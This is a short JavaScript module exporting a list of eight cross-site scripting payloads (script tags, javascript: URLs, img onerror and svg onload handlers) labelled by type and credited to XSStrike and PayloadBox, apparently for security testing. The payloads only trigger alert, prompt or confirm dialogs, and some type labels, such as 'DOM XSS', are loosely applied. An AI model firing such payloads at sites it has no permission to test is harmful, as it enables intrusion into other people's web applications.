export const xssPayloads = [
  {
    payload: '<script>alert("XSS")</script>',
    type: 'Basic XSS'
  },
  {
    payload: '"><script>alert("XSS")</script>',
    type: 'DOM XSS'
  },
  {
    payload: 'javascript:alert("XSS")//',
    type: 'URL-based XSS'
  },
  {
    payload: '<img src="x" onerror="alert(\'XSS\')">',
    type: 'HTML Injection'
  },
  {
    payload: '<svg/onload=alert("XSS")>',
    type: 'SVG-based XSS'
  },
  // Additional payloads from XSStrike and PayloadBox
  {
    payload: '<script>prompt(1)</script>',
    type: 'Basic Prompt XSS'
  },
  {
    payload: '"><script>confirm(1)</script>',
    type: 'DOM Confirmation XSS'
  },
  {
    payload: '<img src=x onerror=prompt(1)>',
    type: 'Image Error XSS'
  }
];